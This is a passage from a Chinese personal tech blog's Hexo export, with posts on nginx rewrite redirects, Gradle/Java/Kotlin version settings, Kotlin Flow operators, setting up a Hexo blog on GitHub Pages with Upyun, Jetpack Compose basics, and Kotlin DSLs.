<h2 id="permanent-和-redirect关键字的区别"><a href="#permanent-和-redirect关键字的区别" class="headerlink" title="permanent 和 redirect关键字的区别"></a>permanent 和 redirect关键字的区别</h2><ul>
<li><code>rewrite … permanent</code>   永久性重定向，请求日志中的状态码为301</li>
<li><code>rewrite … redirect</code>         临时重定向，请求日志中的状态码为302</li>
</ul>
]]></content>
      <categories>
        <category>最佳实践</category>
      </categories>
      <tags>
        <tag>nginx</tag>
        <tag>ssl</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title>gradle&amp;amp;java&amp;amp;kotlin版本冲突问题</title>
    <url>/posts/60514e93/</url>
    <content><![CDATA[<h1 id="java-kotlin-version"><a href="#java-kotlin-version" class="headerlink" title="java&amp;kotlin version"></a>java&amp;kotlin version</h1><p>在使用android时，通常会遇到因为jvm版本不匹配导致的报错问题，因此现在说明一下关于这些内容。</p>
<p>通常我们可以看到以下内容</p>
<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line">compileOptions &#123;</span><br><span class="line">        sourceCompatibility = JavaVersion.VERSION_1_8</span><br><span class="line">        targetCompatibility = JavaVersion.VERSION_1_8</span><br><span class="line">    &#125;</span><br><span class="line">    kotlinOptions &#123;</span><br><span class="line">        jvmTarget = <span class="string">&quot;1.8&quot;</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h2 id="java-version-and-java-bite-code-version"><a href="#java-version-and-java-bite-code-version" class="headerlink" title="java version and java bite code version"></a>java version and java bite code version</h2><p>通常我们写出来的代码，即直接java代码这些被称为·java version，and另一个版本就是这些代码被转化为字节码即java bitecode version。通常java版本越高，我们可以使用到的语言功能越多。而java bitecode version通常发展的比java版本慢很多，他与我们可以使用到语言特点，功能没有直接的关系。</p>
<p>至于<code>compileOptions</code>和<code>kotlinOptions</code>的区别是由于，在一个项目中，我们通常可以看到<code>kotlin</code>和<code>java</code>混用，而这就是分别对于他们的编译器版本</p>
<p>对于<code>sourceCompatibility</code>通常指的是我们能够使用到java版本，通常你可以设置为更高级的版本，但那并不意味这你看也i使用这些高版本的java功能。因为实际上android不一定能够支持这些高版本的java。例如android14才最高·1支持java17的版本，而android13以前都最高只支持java11的版本。</p>
<p><code>targetCompatibility</code>在这里他指的是java bitecode version。你甚至可以设定为18，因为他不会对你选择的java版本的语言功能造成影响。而且java bitecode version通常可以和旧版本的兼容</p>
<p><code>kotlinOptions</code>中的<code>jvmTarget</code>指的就是target的版本，也就是java bitecode version</p>
<h3 id="版本冲突问题"><a href="#版本冲突问题" class="headerlink" title="版本冲突问题"></a>版本冲突问题</h3><p>通常对于你引入的library，或许他们支持的字节码版本是jvm18.而你的android的目标字节码版本是jvm8。那么他们很可能是兼容的，但这并不一定，也会有例外</p>
<p>很多时候的问题是因为gradle的版本问题，因为到了gradle8之后，他便必须使用jdk17以上</p>
]]></content>
      <categories>
        <category>kotlin</category>
      </categories>
  </entry>
  <entry>
    <title>flow中merge，combine，zip的区别</title>
    <url>/posts/18eac30d/</url>
    <content><![CDATA[<figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fun</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> flow1 = (<span class="number">1.</span><span class="number">.10</span>).asFlow().onEach &#123; delay(<span class="number">300L</span>) &#125;</span><br><span class="line">    <span class="keyword">var</span> flow2 = (<span class="number">11.</span><span class="number">.20</span>).asFlow().onEach &#123; delay(<span class="number">1000L</span>) &#125;</span><br><span class="line"></span><br><span class="line">    runBlocking &#123;</span><br><span class="line">        flow1.combine(flow2) &#123; n1, n2 -&gt;</span><br><span class="line">            println(<span class="string">&quot;combine  <span class="variable">$n1</span>:<span class="variable">$n2</span>&quot;</span>)</span><br><span class="line">        &#125;.collect()</span><br><span class="line">        flow1.zip(flow2) &#123; n1, n2 -&gt;</span><br><span class="line">            println(<span class="string">&quot;zip  <span class="variable">$n1</span>:<span class="variable">$n2</span>&quot;</span>)</span><br><span class="line">        &#125;.collect()</span><br><span class="line">        merge(flow1, flow2).onEach &#123; it -&gt;</span><br><span class="line">            println(<span class="string">&quot;merge <span class="variable">$it</span>&quot;</span>)</span><br><span class="line">        &#125;.collect()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>结果如下：<br>&#x2F;&#x2F;在第一轮时，combine会等待两个流中都传入值才会继续进行，而后进行只需判断是否有值即可。<br>combine  3:11<br>combine  4:11<br>combine  5:11<br>combine  6:11<br>combine  6:12<br>combine  7:12<br>combine  8:12<br>combine  9:12<br>combine  9:13<br>combine  10:13<br>combine  10:14<br>combine  10:15<br>combine  10:16<br>combine  10:17<br>combine  10:18<br>combine  10:19<br>combine  10:20<br>zip  1:11<br>zip  2:12<br>zip  3:13<br>zip  4:14<br>zip  5:15<br>zip  6:16<br>zip  7:17<br>zip  8:18<br>zip  9:19<br>zip  10:20<br>merge 1<br>merge 2<br>merge 3<br>merge 11<br>merge 4<br>merge 5<br>merge 6<br>merge 12<br>merge 7<br>merge 8<br>merge 9<br>merge 13<br>merge 10<br>merge 14<br>merge 15<br>merge 16<br>merge 17<br>merge 18<br>merge 19<br>merge 20</p>
]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>flow</tag>
        <tag>kotlin</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo+githubPage+又拍云 搭建自用博客</title>
    <url>/posts/2b6c1927/</url>
    <content><![CDATA[<blockquote>
<p>首先，再看这篇博客之前，我希望可以好好明确搭建博客的意义。是为了记录自己的生活，学习。或者分享自己的经验等其他各种原因。而不是为了白嫖而白嫖。那样子你的博客是写不下去的。</p>
</blockquote>
<h2 id="搭建博客"><a href="#搭建博客" class="headerlink" title="搭建博客"></a>搭建博客</h2><p>这里简单说一下搭建博客的流程。</p>
<ol>
<li>首先先再本地安装环境，包括node，hexo，git，具备一个写博客的编辑器（如typora，vscode）之类的</li>
<li>有一个github账号。</li>
<li>有自己的域名（没有也行，但是有自己的域名再搭配上自己的博客会更有成就感。至少我们可以和别人装逼。我们有自己的博客网站。）</li>
<li>经过一系列的繁琐操作，部署完成后</li>
<li>开始写你的博客</li>
</ol>
<h2 id="安装node，hexo，git"><a href="#安装node，hexo，git" class="headerlink" title="安装node，hexo，git"></a>安装node，hexo，git</h2><p><strong>安装nodejs</strong><br>进入<a href="https://nodejs.cn/download/">官网</a>,选择最新版的安装包进行下载<br><img src="https://image.zfxt.top/hexo-blog/hexo-githubPage-%E5%8F%88%E6%8B%8D%E4%BA%91-%E6%90%AD%E5%BB%BA%E8%87%AA%E7%94%A8%E5%8D%9A%E5%AE%A2-2024-03-15-09-52-53.png" alt="hexo-githubPage-又拍云-搭建自用博客-2024-03-15-09-52-53"><br>下载后，直接安装<br><strong>检测安装是否安装</strong><br>按住<code>win+R</code>输入<code>cmd</code>进入命令行界面。 输入<code>node+v</code>如果出现node的版本号，即安装完成<br><img src="https://image.zfxt.top/hexo-blog/hexo-githubPage-%E5%8F%88%E6%8B%8D%E4%BA%91-%E6%90%AD%E5%BB%BA%E8%87%AA%E7%94%A8%E5%8D%9A%E5%AE%A2-2024-03-15-09-57-49.png" alt="hexo-githubPage-又拍云-搭建自用博客-2024-03-15-09-57-49"></p>
<p><em>他不用换源也挺快的，所以这里不演示换源的方法</em><br>这里我推荐另一种安装node的方法，就是使用nvm，它是一个可以管理多个node环境的工具。也可以很方便的换源。这也是我自己一直在使用的。（可以看我另一篇<a href="https://zfxt.top/posts/5a6c750f/">文章</a>）</p>
<p><strong>安装git</strong><br>进入<a href="https://git-scm.com/download">下载界面</a>.选择你需要的版本进行下载。<br>下载后按需进行安装。如果看不懂英文，可以便翻译便安装。也可以选择按照默认的进行安装，也可以看看网上更加详细的git安装教程。<br>可能会有的不同的就是，我会把git集成到PATH中，这样cmd中也可以使用git。而不用使用<code>git bash</code>那个不好看的那个小黑框<br><strong>配置ssh key</strong><br>配置ssh key可以以后再提交时不用再进行身份验证,省去了很多麻烦.</p>
<ol>
<li>在命令行输入下面这段代码来生成非对称密钥<br><code>ssh-keygen -t ed25519 -C &quot;your_email@example.com&quot;</code><br>他会自动保存在C:&#x2F;users&#x2F;{用户名}&#x2F;.ssh中,一个是私钥,一个带有<code>.pub</code>后缀的是公钥</li>
<li>然后进入github设置中<br><img src="https://image.zfxt.top/hexo-blog/hexo-githubPage-%E5%8F%88%E6%8B%8D%E4%BA%91-%E6%90%AD%E5%BB%BA%E8%87%AA%E7%94%A8%E5%8D%9A%E5%AE%A2-2024-03-15-17-23-39.png" alt="hexo-githubPage-又拍云-搭建自用博客-2024-03-15-17-23-39"><br>选择”新增一个密钥”,把你的公钥输入进去.</li>
<li>校验是否配置完成<br>在命令行输入<code>ssh -T git@github.com</code><br>如果有正确的结果显示就没有问题(就是一个yes什么什么的.)</li>
</ol>
<blockquote>
<p>这儿是<a href="https://docs.github.com/zh/authentication/connecting-to-github-with-ssh/generating-a-new-ssh-key-and-adding-it-to-the-ssh-agent">官方说明</a></p>
</blockquote>
<p><strong>安装hexo</strong><br>选择一个你喜欢的目录(例如&#x2F;hexo-blog).然后执行如下命令:</p>
<p>全局安装hexo工具<br><code>npm install -g hexo-cli</code><br>校验hexo是否安装完成<br><code>hexo -v</code><br>在指定的文件夹进行hexo初始化<br><code>hexo init</code><br>然后直接启动服务<br><code>hexo s</code><br>查看<code>localhost:4000</code>就可以看到你已经开启的服务了(这里常用来校验你写的博客,或者样式配置是否有问题)</p>
<p>这些是最常用的命令</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">清除./public下的缓存</span></span><br><span class="line">hexo clean</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">生成public目录,并将文件都重载</span></span><br><span class="line">hexo g</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">将./public目录下的内容部署到你配置的github上</span></span><br><span class="line">hexo d</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">开启一个hexo的本地服务</span></span><br><span class="line">hexo s</span><br></pre></td></tr></table></figure>

<p><a href="https://hexo.io/zh-cn/docs/commands">官网的所有命令</a></p>
<p>到此为止你的hexo已经可以启动了,这就是最基础的教学.你还可以添加别人写好的很好看的主题.但我不会过多说明,我这里只演示butterfly主题的配置过程.</p>
<h3 id="主题进阶"><a href="#主题进阶" class="headerlink" title="主题进阶"></a>主题进阶</h3><blockquote>
<p>这里是butterfly的官网和项目地址<br>官方说明 <a href="https://butterfly.js.org/">https://butterfly.js.org/</a><br>项目地址 <a href="https://github.com/jerryc127/hexo-theme-butterfly">https://github.com/jerryc127/hexo-theme-butterfly</a></p>
</blockquote>
<p>修改 Hexo 根目录下的 <code>_config.yml</code>，把主题改为 butterfly<br><code>theme: butterfly</code><br>更多的样式配置我就不说明了,你直接看官方文档说明会更好.</p>
<h2 id="配置github-Page"><a href="#配置github-Page" class="headerlink" title="配置github Page"></a>配置github Page</h2><p>首先要说明的是,<code>Github Pages</code>可以配置无限多个页面,你可以把他当作简化版nginx,他可以帮你部署前端页面.</p>
<ol>
<li><p>在任何页面的右上角，选择 ，然后单击“新建存储库”****。<br><img src="https://docs.github.com/assets/cb-34248/mw-1440/images/help/repository/repo-create-global-nav-update.webp" alt="1"></p>
</li>
<li><p>GitHub 下拉菜单的屏幕截图，其中显示了用于创建新项的选项。 菜单项“新建存储库”用深橙色框标出。<br><img src="https://docs.github.com/assets/cb-26658/mw-1440/images/help/repository/create-repository-owner.webp" alt="2"></p>
</li>
<li><p>使用“所有者”下拉菜单选择你想要拥有存储库的帐户。<br>新 GitHub 存储库的所有者菜单的屏幕截图。 菜单显示两个选项：“octocat”和“github”。<br><img src="https://docs.github.com/assets/cb-48482/mw-1440/images/help/pages/create-repository-name-pages.webp" alt="3"><br>输入仓库的名称和说明（可选）。 如果要创建用户或组织站点，则存储库必须命名为 <user>.github.io 或 <organization>.github.io。 如果您的用户或组织名称包含大写字母，您必须小写字母。 有关详细信息，请参阅“关于 GitHub Pages”。</p>
</li>
</ol>
<p>然后你在仓库中创建一个<code>index.html</code>并任意编写一段开场白(<strong>hello world</strong>).等他完成部署后,查看github为你生成的页面<code>&lt;user&gt;.github.io</code>.看到你自己的开场白就算完成github page的使用.</p>
<blockquote>
<p>对于github page的使用,这是最常用的.你会有一个github给你使用的二级域名.<br>而他的其他用法,你可以在其他仓库创建一个分支,一般名字为<code>gh-pages</code>.然后这个分支也会自动为你部署一个page,他的访问地址是<code>&lt;user&gt;.github.io/&lt;仓库名&gt;/</code>.但是一般都用上面哪一种.也可能会有更多的方法,但是我没学.我也不知道.</p>
</blockquote>
<h2 id="hexo-github开始上传自己的博客"><a href="#hexo-github开始上传自己的博客" class="headerlink" title="hexo+github开始上传自己的博客"></a>hexo+github开始上传自己的博客</h2><p>hexo配置以及使用<br>有两个配置文件：</p>
<p>一个是根目录下的<code>_config.yml</code>称为站点配置文件<br>一个是<code>themes/landscape/_config.yml</code>称为主题配置文件(默认主题：landscape)</p>
<p><strong>配置根目录下的<code>_config.yml</code></strong></p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">url:</span> <span class="string">https://yourname.github.io/</span></span><br><span class="line"><span class="attr">theme:</span> <span class="string">butterfly</span> <span class="comment">#选择你想用的主题，我用的是butterfly</span></span><br><span class="line"><span class="attr">deploy:</span></span><br><span class="line">    <span class="attr">type:</span> <span class="string">git</span> <span class="comment"># 不要使用github</span></span><br><span class="line">    <span class="attr">repo:</span> <span class="string">git@github.com:&lt;user&gt;/&lt;user&gt;.github.io.git</span> <span class="comment"># 使用ssh连接</span></span><br><span class="line">    <span class="attr">branch:</span> <span class="string">main</span> <span class="comment"># 默认main分支</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#   message: add new blog # 自动部署commit备注，可不填</span></span><br></pre></td></tr></table></figure>

<p>然后执行</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<p>你的所有博客内容就会被推送到github上,稍等一会,你就可以在自己的网站上看到自己布置的博客了.</p>
<h2 id="写博客"><a href="#写博客" class="headerlink" title="写博客"></a>写博客</h2><p>这里我就不废话,直接看官方说明<a href="https://hexo.io/zh-cn/docs/writing.html">https://hexo.io/zh-cn/docs/writing.html</a><br><strong>至此你就已经完成hexo+github搭建博客的全过程,结束</strong></p>
<p>好吧,还有内容.</p>
<h2 id="图床服务"><a href="#图床服务" class="headerlink" title="图床服务"></a>图床服务</h2><p>说明一下,你可以用,也可以不用.在你写博客的时候,你会经常需要在文章中粘贴图片.hexo会有对应的插件,当你写博客时,他会帮你把图片保存在你的某个img文件夹里头,然后再生成对应的调用这个图片的md语句.<br><strong>可是</strong>,<br>我不是单纯从hexo开始的,我最开始用过wordpress(太笨重,启用了),typecho(服务器到期了,迁移的时候,出了毛病),memos(这个是最轻量化的,但他对标的是笔记本,而不是博客.)最后为了把一些文章进行迁移,还有图片也需要进行迁移,<strong>巨麻烦</strong>.尽管我都搞完了,但是这让我痛定思痛.不如统一管理吧.</p>
<p>这里推荐两个:<strong>七牛云</strong>,<strong>又拍云</strong>.</p>
<ul>
<li><p><strong>七牛云</strong>:<br>  他有免费的额度.但是他只支持http.如果你要使用https需要额外付费.而使用https往往是我们写博客时所必要的(也没说必要,只是看着舒服很多.嘿嘿~).所以我并不推荐七牛云.如果你只用http那就随你了.</p>
<blockquote>
<p>如果你的博客使用了https,那么他就不能读取这些用http加载的图片文件,这是规定</p>
</blockquote>
</li>
<li><p><strong>又拍云</strong>:<br>  他就很好的满足了我的要求,他支持免费的https用来进行云存储.而且他对免费的使用不仅仅是多少额度的问题.他会给你67元代金券限期一年,每年都会发放,你不仅可以用来做oss对象存储,还可以给自己的github page做cdn加速.这就很香~.这样国内也可以很方便的访问到.要用它,你得在页面下面加一些说明:我这里直接给出我的:</p>
  <figure class="highlight html"><table><tr><td class="code"><pre><span class="line">本网站由 <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://www.upyun.com/?utm_source=lianmeng<span class="symbol">&amp;amp;</span>utm_medium=referral&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/gh/xingjiahui/CDN/又拍云_logo.png&quot;</span> <span class="attr">align</span>=<span class="string">&quot;absmiddle&quot;</span> <span class="attr">width</span>=<span class="string">&quot;59px&quot;</span> <span class="attr">height</span>=<span class="string">&quot;30px&quot;</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span> 提供CDN加速/云存储服务</span><br></pre></td></tr></table></figure>

<p>  <img src="https://image.zfxt.top/hexo-blog/hexo-githubPage-%E5%8F%88%E6%8B%8D%E4%BA%91-%E6%90%AD%E5%BB%BA%E8%87%AA%E7%94%A8%E5%8D%9A%E5%AE%A2-2024-03-15-19-29-33.png" alt="hexo-githubPage-又拍云-搭建自用博客-2024-03-15-19-29-33"><br>  就像这样子.</p>
<blockquote>
<p>但是呢,说归说,你要在国内提供网站服务,你总得有个自己的域名,这个域名还得备案.这个就是使用的前提,你得备案.(要么自定义域名+备案)(要么就用<code>&lt;user&gt;.github.io</code>)</p>
</blockquote>
</li>
</ul>
<h2 id="又拍云的使用细则"><a href="#又拍云的使用细则" class="headerlink" title="又拍云的使用细则"></a>又拍云的使用细则</h2><p>欸,我就不写了,反正我也是看别人的学的<br>喏 <a href="https://cloud.tencent.com/developer/article/1834572">https://cloud.tencent.com/developer/article/1834572</a><br>看这篇文章,你就会搞啦.就是这样.</p>
<h2 id="线上写博客"><a href="#线上写博客" class="headerlink" title="线上写博客"></a>线上写博客</h2><p>我们不可能一直在一台电脑上写博客,我们还会有身上没有电脑,或者在使用公共的电脑,这样就会很不方便写博客.于是乎,你可以这样:<br>把自己的hexo博客上传到github上,随便取名,然后你使用github的代码空间,github会每个月免费120个小时的使用时间,pro用户有180个小时.你有2h8g和4h16g的配置可选,他会为你在linux部署一个vscode然后通过web链接.这样你在线上也可以痛快的写代码了.而且你还可以登录,他可以同步你本地所有设置.你需要hexo d的时候也可以像我上文写的那样,部署一个ssh密钥,通过ssh链接部署.然后再提交到你的<code>&lt;user&gt;.github.io</code>仓库里.</p>
<p><strong>就是这样,喵~</strong><br>当然也有另一种做法,就是使用<strong>Github Action</strong>.但是小子愚钝,弄不明白,这是大佬的文章<a href="https://cloud.tencent.com/developer/article/2119710">https://cloud.tencent.com/developer/article/2119710</a></p>
<p>你们能搞定最好,搞不定.向我那样子写博客也是可以的哦.</p>
]]></content>
      <categories>
        <category>白嫖</category>
      </categories>
  </entry>
  <entry>
    <title>jetpack compose(入门)</title>
    <url>/posts/d2b22915/</url>
    <content><![CDATA[<h1 id="为什么我们需要一个新的UI-工具"><a href="#为什么我们需要一个新的UI-工具" class="headerlink" title="为什么我们需要一个新的UI 工具?"></a>为什么我们需要一个新的UI 工具?</h1><p>原因是 View.java 这个类实在是太大了，有太多的代码，它大到你甚至无法在Githubs上查看该文件，因为它实际上包含了 30000 行代码，这很疯狂，而我们所使用的几乎每一个Android UI 组件都需要继承于View.</p>
<h1 id="Compose-API-的原则"><a href="#Compose-API-的原则" class="headerlink" title="Compose API 的原则"></a>Compose API 的原则</h1><ol>
<li>Compose是一个声明式UI系统。 他的一切都是函数</li>
<li>在Compose的世界中，没有类的概念，全都是函数，并且都是顶层函数，因此不会有任何继承和层次机构问题。</li>
<li>组合优于继承</li>
<li>信任单一来源</li>
</ol>
<h1 id="Compose运行"><a href="#Compose运行" class="headerlink" title="Compose运行"></a>Compose运行</h1><h2 id="Core"><a href="#Core" class="headerlink" title="Core"></a>Core</h2><ul>
<li>绘制(Draw) Draw 给了你访问Canvas的能力，因此你可以绘制你要的任何自定义View</li>
<li>布局(Layout) 通过布局，我们可以测量事物并相应地放置视图</li>
<li>输入(Input)开发人员可以通过输入访问事件并执行手势</li>
<li>语义(Semantics) 我们可以提供有关树的语义信息</li>
</ul>
<h2 id="Foundation"><a href="#Foundation" class="headerlink" title="Foundation"></a>Foundation</h2><p>Foundation的核心是收集上面提到的所有内容，并共同创建一个抽象层 ，以使开发人员更轻松调用</p>
<h2 id="Material"><a href="#Material" class="headerlink" title="Material"></a>Material</h2><p>在这一层。所有的Material组件将会被提供，并且我们可以通过提供的这些组件来构建复杂的UI</p>
<h2 id="插槽API"><a href="#插槽API" class="headerlink" title="插槽API"></a>插槽API</h2><p>插槽API的出现是为了给开发人员留出了很多空间，以便他们可以执行所需的任何自定义操作</p>
<h1 id="创建compose函数"><a href="#创建compose函数" class="headerlink" title="创建compose函数"></a>创建compose函数</h1><p>Jetpack Compose是围绕 composable 函数来构建的。这些函数使你可以通过描述应用程序的形状和数据依赖，以编程方式定义应用程序的UI，而不是着眼于UI的构建过程。要创建 composable 函数，只需要在函数名前面加上一个<code>@composable</code>注解即可。该注解必须用于不接受参数的可组合函数。因此，您无法直接预览 MessageCard 函数，而是需要创建另一个名为 PreviewMessageCard 的函数</p>
<h2 id="布局"><a href="#布局" class="headerlink" title="布局"></a>布局</h2><p>在Jetpack Compose中，你可以通过从其他 composable 函数中调composable 函数来构建UI层次结构。</p>
<h3 id="column"><a href="#column" class="headerlink" title="column"></a>column</h3><p>要使重叠绘制的 Text 文本能够垂直排列，我们就需要使用到 Column 函数<br>在调用 Column（） 时，可以传递参数给 Column（） 来配置 Column 的大小、位置以及设置子元素的排列方式。</p>
<h2 id="Material-Design"><a href="#Material-Design" class="headerlink" title="Material Design"></a>Material Design</h2><p>首先，使用在您的项目中创建的 Material 主题 <code>ComposeTutorialTheme</code> 和 Surface 来封装 MessageCard 函数。<br><code>ComposeTutorialTheme</code>是定义在你的<code>ui/theme.kt</code>中的，在 @Preview 和 setContent 函数中都需要执行此操作。这样一来，可组合项即可沿用应用主题中定义的样式，从而在整个应用中确保一致性。<br><strong>Material Design 是围绕 Color、Typography、Shape 这三大要素构建的。您将逐一添加这些要素。</strong></p>
<h2 id="重组"><a href="#重组" class="headerlink" title="重组"></a>重组</h2><p>Compose 应用通过调用可组合函数将数据转换为界面。如果您的数据发生变化，Compose 会使用新数据重新执行这些函数，从而创建更新后的界面，此过程称为<strong>重组</strong>。Compose 还会查看各个可组合项需要哪些数据，以便只需重组数据发生了变化的组件，而避免重组未受影响的组件。</p>
<blockquote>
<p>更改此变量不会触发重组的原因是 Compose 并未跟踪此更改。此外，每次调用 Greeting 时，都会将该变量重置为 false。</p>
</blockquote>
<h2 id="状态提升"><a href="#状态提升" class="headerlink" title="状态提升"></a>状态提升</h2><p>在可组合函数中，被多个函数读取或修改的状态应位于共同祖先实体中，此过程称为状态提升。“提升”意为“提高”或“升级”。<br>使状态可提升，可以避免复制状态和引入 bug，有助于重复使用可组合项，并大大降低可组合项的测试难度。相反，不需要由可组合项的父级控制的状态则不应该被提升。可信来源属于该状态的创建者和控制者。</p>
<h2 id="保留状态"><a href="#保留状态" class="headerlink" title="保留状态"></a>保留状态</h2><p><code>var shouldShowOnboarding by rememberSaveable &#123; mutableStateOf(true) &#125;</code><br>运行应用，旋转屏幕，更改为深色模式，或者终止进程。除非您之前退出了应用，否则系统不会显示初始配置屏幕。</p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>compose</tag>
      </tags>
  </entry>
  <entry>
    <title>jetpack compose 修改app字体</title>
    <url>/posts/85ecf67b/</url>
    <content><![CDATA[<blockquote>
<p>如果你使用的是xml来写UI的话，可以查看这个<a href="https://blog.csdn.net/Gold_brick/article/details/52865369">文章</a>，里面有很详尽的关于app修改字体的方法。</p>
</blockquote>
<p>这里主要说明的是使用jetpack compose进行开发时，你修改字体需要设置你的<code>type.kt</code><br>![](<a href="https://image.zfxt.top/hexo-blog/jetpack">https://image.zfxt.top/hexo-blog/jetpack</a> compose 修改app字体-2023-12-05-06-45.png)<br>在其中将默认字体改为你自己定义的字体<br>![](<a href="https://image.zfxt.top/hexo-blog/jetpack">https://image.zfxt.top/hexo-blog/jetpack</a> compose 修改app字体-2023-12-18-31-55.png)<br>![](<a href="https://image.zfxt.top/hexo-blog/jetpack">https://image.zfxt.top/hexo-blog/jetpack</a> compose 修改app字体-2023-12-05-00-34.png)<br>然后即可完成字体的修改</p>
]]></content>
      <categories>
        <category>Android入门</category>
      </categories>
      <tags>
        <tag>jetpack compose</tag>
        <tag>字体替换</tag>
      </tags>
  </entry>
  <entry>
    <title>kotlin(DSL)</title>
    <url>/posts/ab061c7f/</url>
    <content><![CDATA[<h2 id="领域特定语言和通用编程语言"><a href="#领域特定语言和通用编程语言" class="headerlink" title="领域特定语言和通用编程语言"></a>领域特定语言和通用编程语言</h2><p>通用编程语言：有一系列足够完善的能力解决几乎所有计算机能解决的问题。<br>领域特定语言（DSL）：专注在特定任务上，放弃与之无关的功能。如SQL，正则表达式。他们趋向于解决特定的问题，但对于整个应用程序，他们是无法构造的。</p>
<p>DSL趋向于声明式，而通用编程语言趋向于命令式。他们的区别在于：声明式语言会将想要的结果和执行细节留给解释他的引擎。通常只需要优化一次。而命令式语言要求每一个操作都被独立优化。通常声明式会更有效率一些。<br>而这就带来了一些缺点，比如SQL不能直接嵌入到其他语言中一起使用。单独的语言也需要单独的学习。</p>
<h2 id="DSL风格的API和普通API"><a href="#DSL风格的API和普通API" class="headerlink" title="DSL风格的API和普通API"></a>DSL风格的API和普通API</h2><p>DSL的API往往会更加整洁<img src="https://image.zfxt.top/hexo-blog/kotlin(DSL)-2023-07-23-06-44.png"><br>而且通过DSL比单独构造出来的API更具表现力和更适宜工作。</p>
<h2 id="内部DSL"><a href="#内部DSL" class="headerlink" title="内部DSL"></a>内部DSL</h2><p>通过使用主要语言的特定方式，同时保留独立语法的DSL的主要优点。</p>
<h3 id="DSL的结构"><a href="#DSL的结构" class="headerlink" title="DSL的结构"></a>DSL的结构</h3><p>通常DSL和API没有明确定义的边界。判断的标准往往是，DSL有着特有的结构或者说文法。一般的API相互调用直接也没有维护上下文。调用时也没有特定语法结构：这种一般被称为命令查询API。与之不同的，DSL的方式会存在一个结构。在kotlin DSL中。结构通常采用嵌套的lambda表达式，或者链式方法创建的。<img src="https://image.zfxt.top/hexo-blog/kotlin(DSL)-2023-07-11-37-10.png"><br>这种文法使我们能够将内部DSL称为一门语言。</p>
<h2 id="带接收者的lambda"><a href="#带接收者的lambda" class="headerlink" title="带接收者的lambda"></a>带接收者的lambda</h2><p>这是kotlin中的一个强大特性。<br>我们以buildString为例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">buildString</span><span class="params">(buiderStringAction: (StringBuilder)</span> -&gt; Unit): String &#123;</span><br><span class="line">    <span class="type">val</span> <span class="variable">sb</span> <span class="operator">=</span> StringBuilder()</span><br><span class="line">    buiderStringAction(sb)</span><br><span class="line">    <span class="keyword">return</span> sb.toString()</span><br><span class="line">&#125;</span><br><span class="line">fun <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">val</span> <span class="variable">s</span> <span class="operator">=</span> buildString &#123;</span><br><span class="line">        it.append(<span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">        it.append(<span class="string">&quot;World!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    println(s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这段代码很好理解。但是我们使用时，必须要通过显示的使用<code>it</code>（或者其他你显示定义的参数名)。才能完成传值。<br>如果我们想去掉<code>it.</code>前缀，用append代替it.append。要做到这一点，就需要使用<strong>带接受者的lambda</strong>。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fun <span class="title function_">buildString</span><span class="params">(buiderStringAction: StringBuilder.()</span> -&gt; Unit): String &#123;</span><br><span class="line">    <span class="type">val</span> <span class="variable">sb</span> <span class="operator">=</span> StringBuilder()</span><br><span class="line">    sb.buiderStringAction()</span><br><span class="line">    <span class="comment">//下面这个方法在这任然可以使用</span></span><br><span class="line">    <span class="comment">//buiderStringAction(sb)</span></span><br><span class="line">    <span class="keyword">return</span> sb.toString()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">val</span> <span class="variable">s</span> <span class="operator">=</span> buildString &#123;</span><br><span class="line">        append(<span class="string">&quot;Hello, &quot;</span>)</span><br><span class="line">        append(<span class="string">&quot;World!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">    println(s)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这就是带接受者的lambda。它的append实际上就是this.append但是this可以省略。<img src="https://image.zfxt.top/hexo-blog/kotlin(DSL)-2023-07-20-45-23.png"><br>这个样式是不是非常像扩展函数？通过扩展函数，不需要显示的修饰符就可以访问一个外部类的成员。如stringBuild使用append方法。实际上一个扩展函数类型描述了一个可以被当作扩展函数来调用的代码块。<strong>再次重申，这里的 builderAction 并不是StringBuilder 类的方法，它是一个函数类型的参数，但可以用调用扩展函数一样的语法调用它。</strong><br><img src="https://image.zfxt.top/hexo-blog/kotlin(DSL)-2023-07-19-09-21.png"></p>
<h2 id="invoke约定"><a href="#invoke约定" class="headerlink" title="invoke约定"></a>invoke约定</h2><p>它的作用是可以把类当函数一样使用。<br>当你声明了operator invoke方法时，你直接调用类，作为方法，然后它会自动执行invoke中的函数体，如下：</p>
